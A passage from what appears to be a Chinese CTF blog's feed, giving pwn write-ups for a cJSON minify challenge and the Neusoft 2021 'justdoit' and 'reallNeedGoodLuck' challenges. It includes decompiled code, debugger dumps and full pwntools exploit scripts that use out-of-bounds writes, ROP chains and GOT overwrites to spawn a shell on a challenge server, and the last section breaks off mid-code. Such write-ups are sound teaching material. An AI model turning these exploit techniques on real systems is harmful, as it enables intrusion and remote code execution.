<span class="keyword">case</span> <span class="string">'\n'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">if</span> ( *str_a1 != <span class="string">'/'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *str_a1 != <span class="string">'/'</span> || str_a1[<span class="number">1</span>] != <span class="string">'*'</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *str_a1 == <span class="string">'"'</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v2 = str_a1;</span><br><span class="line">                v18 = str_a1 + <span class="number">1</span>;</span><br><span class="line">                v3 = *v2;</span><br><span class="line">                v4 = last;</span><br><span class="line">                v20 = (<span class="keyword">signed</span> __int64)(last + <span class="number">1</span>);</span><br><span class="line">                *v4 = v3;</span><br><span class="line">                <span class="keyword">while</span> ( *v18 &amp;&amp; *v18 != <span class="string">'"'</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( *v18 == <span class="string">'\\'</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v5 = v18++;</span><br><span class="line">                    v6 = *v5;</span><br><span class="line">                    v7 = (_BYTE *)v20++;</span><br><span class="line">                    *v7 = v6;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v8 = v18++;</span><br><span class="line">                  v9 = *v8;</span><br><span class="line">                  v10 = (_BYTE *)v20++;</span><br><span class="line">                  *v10 = v9;</span><br><span class="line">                &#125;</span><br><span class="line">                v11 = v18;</span><br><span class="line">                str_a1 = v18 + <span class="number">1</span>;</span><br><span class="line">                v12 = *v11;</span><br><span class="line">                v13 = (_BYTE *)v20;</span><br><span class="line">                last = (<span class="keyword">char</span> *)(v20 + <span class="number">1</span>);</span><br><span class="line">                *v13 = v12;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v14 = str_a1++;</span><br><span class="line">                v15 = *v14;</span><br><span class="line">                v16 = last++;</span><br><span class="line">                *v16 = v15;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( *str_a1 &amp;&amp; (*str_a1 != <span class="string">'*'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span>) )</span><br><span class="line">                ++str_a1;</span><br><span class="line">              str_a1 += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( *str_a1 &amp;&amp; *str_a1 != <span class="string">'\n'</span> )</span><br><span class="line">              ++str_a1;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = last;</span><br><span class="line">    *last = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后输出处理后，第二次输入的字符串的前8位。</p><h2 id="漏洞点与利用"><a href="#漏洞点与利用" class="headerlink" title="漏洞点与利用"></a>漏洞点与利用</h2><p>这里在<code>cJSON_Minify</code>函数中有个两个问题，第一个是越界(即<code>cJSON_Minify</code>第89-92行）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *str_a1 &amp;&amp; (*str_a1 != <span class="string">'*'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span>) )</span><br><span class="line">    ++str_a1;</span><br><span class="line">  str_a1 += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当字符串中有<code>\*</code>开头时，会不断遍历剩下字符直到遇到<code>\x00</code>或<code>*/</code>。但这里没有写仔细，如果遇到<code>*/</code>最后<code>str_a1 += 2;</code>是合理的但是遇到的是<code>\x00</code></p><p>就有越界的风险。</p><p>第二个问题是在对一般字符处理时（即<code>cJSON_Minify</code>第81-84行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v14 &#x3D; str_a1++;</span><br><span class="line">v15 &#x3D; *v14;</span><br><span class="line">v16 &#x3D; last++;</span><br><span class="line">*v16 &#x3D; v15;</span><br></pre></td></tr></table></figure><p>在对正常字符处理时，<code>cJSON_Minify</code>函数<code>str_a1</code>处的数据放入<code>last</code>处，在正常情况下，str_a1的位置和last的位置是一样的。但是如果触发了问题一中的越界，那么<code>str_a1</code>指向我们字符串为<code>\x00</code>的位置还要+1的地方,而last处的还指向字符串的’/‘字符的位置。达成了，越界写。</p><p>就这个题目而言，如果我们输入的字符分别为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">”xxxxxxxx/*oooo“ <span class="comment">#第一次的字符串</span></span><br><span class="line"></span><br><span class="line">”<span class="number">1234567890</span>qqqq” <span class="comment">#第二次字符串，v6</span></span><br></pre></td></tr></table></figure><p>那么，在处理前栈上的数据为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc7f8d67b0: &quot;xxxxxxxx&#x2F;*oooo&quot;</span><br><span class="line">0x7ffc7f8d67bf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67c0: &quot;1234567890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67cf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67d0: &quot;this_is_data_in_server&quot;</span><br></pre></td></tr></table></figure><p>在处理后，第一次字符串中的<code>/*oooo\x00</code>被替换成了第二个字符串中同等长度的字符<code>12345678</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc7f8d67b0: &quot;xxxxxxxx1234567890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67c7: &quot;890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67cf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67d0: &quot;this_is_data_in_server&quot;</span><br></pre></td></tr></table></figure><p>同时，若在第二次字符中还有 <code>/*</code>则将会在再次触发上面的步骤。</p><p>经过测试后发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf： xxxxxxxxxxxx&#x2F;*   v6:1111&#x2F;*qqqqqqqq</span><br><span class="line"></span><br><span class="line">buf： xxxxx&#x2F;*1111111    v6: &#x2F;*qqqqqqqqqqqq</span><br></pre></td></tr></table></figure><p>正好4次输入正好可以泄露出flag。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/29 09:59:15</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./cJSON_PWN'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> Nonex</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">x=<span class="string">'s/*aaaaaaa'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=<span class="string">'/*'</span>.rjust(<span class="number">0xe</span>,<span class="string">'x'</span>)</span><br><span class="line">y=<span class="string">'1111/*'</span>.ljust(<span class="number">0xe</span>,<span class="string">'q'</span>)</span><br><span class="line">print(x+y)</span><br><span class="line">p.send(x+y)</span><br><span class="line">x=<span class="string">'/*1111111'</span>.rjust(<span class="number">0xe</span>,<span class="string">'x'</span>)</span><br><span class="line">y=<span class="string">'/*'</span>.ljust(<span class="number">0xe</span>,<span class="string">'q'</span>)</span><br><span class="line">print(x+y)</span><br><span class="line">p.send(x+y)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记-信息收集"><a href="#后记-信息收集" class="headerlink" title="后记-信息收集"></a>后记-信息收集</h2><p>在查阅这个题资料时发现这原理是一个信息收集题，orw…</p><p>搜索程序的文件可以看一个github项目：</p><p><img src="image-20211231165136223.png" alt="image-20211231165136223"></p><p>这里就一个看到一个security报告。</p><p><img src="image-20211231165647957.png" alt="image-20211231165647957"></p><p>这里就提到<code>/*</code>的报告，链接<a href="https://github.com/DaveGamble/cJSON/issues/338" target="_blank" rel="noopener">https://github.com/DaveGamble/cJSON/issues/338</a></p><p><img src="image-20211231170448565.png" alt="image-20211231170448565"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个签到都这么有意思，其他题一定也都很有趣吧….</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末有事去了，等缓过来只搞个这个题的文件….</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>东软2021CTF--PWN--wp</title>
    <link href="lexsd6.github.io/2021/12/04/%E4%B8%9C%E8%BD%AF/"/>
    <id>lexsd6.github.io/2021/12/04/%E4%B8%9C%E8%BD%AF/</id>
    <published>2021-12-04T02:18:12.000Z</published>
    <updated>2021-12-10T13:59:17.572Z</updated>
    
    <content type="html"><![CDATA[<p>第一次吃到东软的瓜，虽然是大连东软的(老NSUer气抖冷)……<a id="more"></a></p><h3 id="justdoit"><a href="#justdoit" class="headerlink" title="justdoit"></a>justdoit</h3><p>经过动态gdb发现，如果我们通过栈溢出劫持<code>main</code>重新运行，那么第二次输入的将放在第一次输入数据的上方。这样通过两次合理输入构造，我们可控的输入空间扩大。就可以在泄露出libc的真实地址的同时，然后<code>mian</code>程序流中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7fffbfe39330 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">01:0008│     0x7fffbfe39338 —▸ 0x404028 (read@got.plt) —▸ 0x7f7373e188b0 (read) ◂— mov    eax, dword ptr fs:[0x18]</span><br><span class="line">02:0010│     0x7fffbfe39340 —▸ 0x401030 (puts@plt) ◂— jmp    qword ptr [rip + 0x2fe2]</span><br><span class="line">03:0018│     0x7fffbfe39348 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">04:0020│     0x7fffbfe39350 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">05:0028│     0x7fffbfe39358 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">06:0030│     0x7fffbfe39360 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">07:0038│     0x7fffbfe39368 ◂— 0x0</span><br></pre></td></tr></table></figure><p>再通过LibcSearcher 找到system 和 /bin/sh 的真实地址，然后构造rop链get shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffc354e6078 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">01:0008│     0x7ffc354e6080 —▸ 0x7f6ad64b269b ◂— 0x68732f6e69622f &#x2F;* &#39;&#x2F;bin&#x2F;sh&#39; *&#x2F;</span><br><span class="line">02:0010│     0x7ffc354e6088 —▸ 0x7f6ad6372e10 (system) ◂— test   rdi, rdi</span><br><span class="line">03:0018│     0x7ffc354e6090 ◂— 0x0</span><br><span class="line">04:0020│     0x7ffc354e6098 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">05:0028│     0x7ffc354e60a0 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">06:0030│     0x7ffc354e60a8 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">07:0038│     0x7ffc354e60b0 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/04 17:36:49</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> * <span class="comment">#https://github.com/lexsd6/LibcSearcher_plus</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./justdoit'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65004</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00000000004012b3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x404018 &lt;puts@got.plt&gt;:        0x00007f459ba23210      0x00007f459ba04dc0</span></span><br><span class="line"><span class="comment">#0x404028 &lt;read@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#main  0x4011d5</span></span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(<span class="number">0x4011d5</span>)+p64(<span class="number">0x4011d5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line"><span class="comment">#0x40123e</span></span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(<span class="number">0x4011d5</span>)+p64(<span class="number">0x4011d5</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(e.got[<span class="string">'read'</span>])+p64(e.sym[<span class="string">'puts'</span>]))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">x=finder(<span class="string">'read'</span>,addr)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="reallNeedGoodLuck"><a href="#reallNeedGoodLuck" class="headerlink" title="reallNeedGoodLuck"></a>reallNeedGoodLuck</h3><p>分析程序流发现，在进行任意地址覆盖写时。除了<code>exit</code>函数外的libc函数，都已经延迟绑定完毕。而我们只能覆盖4个字节，单纯操作难以直接修改任何libc为<code>system</code>，同时发现程序流有<code>exit</code>函数来控制结束 ,所以只能先覆盖exit函数来控制程序流。继续审计程序代码发现，在我们通过劫持 <code>exit</code> 函数再次进入程序流时   <code>init</code>函数作用可有可无，同时  <code>init</code>函数中的<code>setvbuf</code>函数不仅got地址可以被我们劫持,第一个参数<code>stdin</code>也受我们控制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0000000000401166                 public init</span><br><span class="line">.text:0000000000401166 init            proc near               ; CODE XREF: main+1C↓p</span><br><span class="line">.text:0000000000401166 ; __unwind &#123;</span><br><span class="line">.text:0000000000401166                 push    rbp</span><br><span class="line">.text:0000000000401167                 mov     rbp, rsp</span><br><span class="line">.text:000000000040116A                 mov     rax, cs:stdin@GLIBC_2_2_5  &#x2F;&#x2F; puts.got</span><br><span class="line">.text:0000000000401171                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000401176                 mov     edx, 2          ; modes</span><br><span class="line">.text:000000000040117B                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000401180                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000401183                 call    _setvbuf&#x2F;&#x2F; puts</span><br><span class="line">.text:0000000000401188                 mov     rax, cs:__bss_start</span><br><span class="line">.text:000000000040118F                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000401194                 mov     edx, 2          ; modes</span><br><span class="line">.text:0000000000401199                 mov     esi, 0          ; buf</span><br><span class="line">.text:000000000040119E                 mov     rdi, rax        ; stream</span><br><span class="line">.text:00000000004011A1                 call    _setvbuf</span><br><span class="line">.text:00000000004011A6                 nop</span><br><span class="line">.text:00000000004011A7                 pop     rbp</span><br><span class="line">.text:00000000004011A8                 retn</span><br><span class="line">.text:00000000004011A8 ; &#125; &#x2F;&#x2F; starts at 401166</span><br><span class="line">.text:00000000004011A8 init            endp</span><br></pre></td></tr></table></figure><p>因此我们先劫持<code>exit</code>让其跳转到执行完<code>init</code>函数处即<code>0x0000000004011CA</code>位置。然后修改<code>setvbuf</code>函数为<code>puts</code>函数。再将<code>stdin</code>地址改<code>puts</code> got 地址与劫持<code>exit</code>函数为完整<code>mian</code>函数来泄露出真实地址。(其实直接<code>stdin</code>,就可以泄露出，但本地环境中常泄露出截断符)</p><p>然后再将<code>atoi</code>函数劫持为<code>system</code>，再传入<code>/bin/sh\x00</code>即可以getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/04 14:33:30</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> * <span class="comment">#https://github.com/lexsd6/LibcSearcher_plus</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./reallNeedGoodLuck.1'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65003</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#0x404018 &lt;puts@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x404038 &lt;exit@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x404030 &lt;atoi@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x00000000004012b3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00404100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,date)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'good'</span>)</span><br><span class="line">    p.send(p32(date))</span><br><span class="line">    p.recvuntil(<span class="string">'luck! '</span>)</span><br><span class="line">    p.sendline(str(addr))</span><br><span class="line"></span><br><span class="line">main_addr_a=<span class="number">0X0000000004011CA</span></span><br><span class="line">main_addr=<span class="number">0x0000000004011A9</span></span><br><span class="line"></span><br><span class="line">edit(e.got[<span class="string">'exit'</span>],main_addr_a)</span><br><span class="line"><span class="comment">#00000000004011D4 </span></span><br><span class="line"><span class="comment">#0x00000000004012b3</span></span><br><span class="line"><span class="comment">#exit   0x404038</span></span><br><span class="line"></span><br><span class="line">edit(e.sym[<span class="string">'stdin'</span>],e.got[<span class="string">'puts'</span>])</span><br><span class="line">edit(e.sym[<span class="string">'stdin'</span>]+<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit((e.got[<span class="string">'setvbuf'</span>]),(e.plt[<span class="string">'puts'</span>]))</span><br><span class="line">edit((e.got[<span class="string">'setvbuf'</span>] + <span class="number">4</span>),(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">edit(e.got[<span class="string">'exit'</span>],main_addr)</span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.recvline()</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'puts'</span>,addr)</span><br><span class="line"><span class="comment">#edit(e.got['exit'],main_addr_a)</span></span><br><span class="line"></span><br><span class="line">p.send(p32(main_addr_a))</span><br><span class="line">p.recvuntil(<span class="string">'luck! '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x404038</span>))</span><br><span class="line"></span><br><span class="line">system_addr=x.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(e.got[<span class="string">'atoi'</span>],u32(p64(system_addr)[:<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">'/bin/sh\x00'</span>,main_addr_a)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h3><p>在overwrite功能在修改变量大于原数量时，修改数据会越界。把下个chuck数据修改，加个PIE未开，可以劫持got表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 